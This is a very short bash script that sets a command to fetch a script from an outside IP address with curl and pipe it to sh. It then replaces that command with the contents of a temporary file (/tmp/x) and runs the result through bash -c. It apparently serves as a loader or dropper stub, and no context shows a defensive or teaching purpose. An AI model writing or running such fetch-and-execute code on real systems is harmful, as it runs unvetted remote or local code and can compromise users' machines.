#!/bin/bash
c="curl -fsSL http://203.0.113.5/i.sh | sh"
printf -v c "%s" "$(cat /tmp/x)"
bash -c "$c"
